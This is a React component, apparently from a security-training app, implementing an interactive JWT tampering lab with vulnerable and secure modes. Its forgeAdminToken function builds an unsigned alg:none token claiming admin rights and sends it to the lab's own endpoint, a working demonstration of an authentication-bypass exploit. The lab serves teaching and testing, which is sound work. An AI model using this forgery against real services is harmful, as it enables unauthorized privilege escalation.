'use client';

import { useState } from 'react';
import { ModeToggle } from '@/components/ModeToggle';
import type { LabMode } from '@/labs/types';

// base64url without padding
function b64url(obj: unknown): string {
  return btoa(JSON.stringify(obj)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

// Forge an unsigned token claiming admin — the classic alg:none attack.
function forgeAdminToken(): string {
  const header = b64url({ alg: 'none', typ: 'JWT' });
  const payload = b64url({ sub: '2', role: 'admin' });
  return `${header}.${payload}.`;
}

export function JwtTamperingLab() {
  const [mode, setMode] = useState<LabMode>('vulnerable');
  const [token, setToken] = useState('');
  const [result, setResult] = useState('');

  const issue = async () => {
    const res = await fetch('/api/labs/jwt-tampering');
    const data = (await res.json()) as { token: string };
    setToken(data.token);
    setResult('Issued a legit role:user token.');
  };

  const tamper = () => {
    setToken(forgeAdminToken());
    setResult('Forged an alg:none token with role:admin. Now verify it.');
  };

  const verify = async () => {
    const res = await fetch(`/api/labs/jwt-tampering?mode=${mode}`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ token }),
    });
    const data = (await res.json()) as {
      ok: boolean;
      role?: string;
      adminAccess?: boolean;
      message?: string;
    };
    setResult(
      data.ok
        ? data.adminAccess
          ? `🔓 Accepted! Server granted ADMIN (role=${data.role}).`
          : `Accepted as role=${data.role}.`
        : `🔒 Rejected: ${data.message}`,
    );
  };

  return (
    <div className="space-y-4">
      <ModeToggle mode={mode} onChange={setMode} />
      <div className="flex flex-wrap gap-2">
        <button onClick={issue} className="rounded-lg border border-border px-4 py-2 text-sm">
          1. Get user token
        </button>
        <button
          onClick={tamper}
          className="rounded-lg bg-danger/20 px-4 py-2 text-sm font-medium text-danger"
        >
          2. Forge admin token
        </button>
        <button
          onClick={verify}
          className="rounded-lg bg-accent/20 px-4 py-2 text-sm font-medium text-accent"
        >
          3. Send to server
        </button>
      </div>
      <textarea
        value={token}
        onChange={(e) => setToken(e.target.value)}
        rows={3}
        placeholder="token"
        className="w-full rounded-lg border border-border bg-bg px-3 py-2 font-mono text-xs"
      />
      {result && <div className="rounded-lg border border-border bg-bg p-3 text-sm">{result}</div>}
    </div>
  );
}
